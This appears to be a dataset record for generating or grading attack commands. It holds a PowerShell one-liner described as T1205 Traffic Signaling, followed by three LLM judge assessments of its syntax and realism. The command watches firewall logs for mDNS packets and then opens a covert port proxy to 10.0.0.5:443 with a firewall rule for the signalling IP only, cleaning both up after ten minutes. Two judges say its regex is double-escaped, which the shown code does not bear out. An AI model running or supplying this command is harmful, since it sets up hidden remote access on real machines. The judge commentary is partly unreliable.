command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\b(ALLOW|DROP)\s+UDP\s+(\d{1,3}(?:\.\d{1,3}){3}).*\s5353\b') { $src=$matches[2]; $name="mdns-proxy-$($src.Replace('.','-'))"; try { netsh interface portproxy add v4tov4 listenport=8443 listenaddress=0.0.0.0 connectport=443 connectaddress=10.0.0.5 | Out-Null } catch {} if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8443 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 600; netsh interface portproxy delete v4tov4 listenport=8443 listenaddress=0.0.0.0 | Out-Null; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Uses mDNS (UDP/5353) traffic as a trigger to expose a covert TLS proxy on 8443 (portproxy to 10.0.0.5:443) for the signaling IP only.
rationale_steps: Create a portproxy and matching scoped firewall allow rule

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced braces/quotes, valid parameters, and parseable pipelines/scriptblocks.
llm_judgments.semantic_justification: It implements mDNS-triggered signaling to stand up a scoped 8443→443 portproxy with timed teardown, but it requires administrative rights and local WinRM remoting despite 'Privilege: None', reducing operational plausibility.

llm_judgments.syntactic_justification: The command is largely well-formed PowerShell with balanced braces and proper pipeline usage, though the double-escaped backslashes (\b, \d, \s) in the regex string suggest the command was serialized/escaped for display rather than direct execution, which could cause regex matching issues at runtime.
llm_judgments.semantic_justification: The command precisely implements T1205 Traffic Signaling by monitoring firewall logs for mDNS (UDP/5353) traffic as a covert trigger, then dynamically creating a port proxy to 10.0.0.5:443 and a scoped firewall rule allowing only the signaling source IP to reach port 8443, with a self-cleaning 10-minute TTL — a highly realistic and operationally coherent implementation of traffic-signal-triggered covert C2 channel establishment.

llm_judgments.syntactic_justification: The command is a well-formed PowerShell script block using valid cmdlets, proper piping, balanced braces, and correct parameter usage for Invoke-Command and netsh.
llm_judgments.semantic_justification: The logic perfectly implements the Traffic Signaling technique by monitoring firewall logs for a specific trigger (mDNS) to dynamically open a port; however, the regex uses double-escaped backslashes (e.g., \\b, \\s, \\d) inside a single-quoted string, which in PowerShell results in matching literal backslashes rather than the intended regex meta-characters, likely causing the trigger to fail in practice.
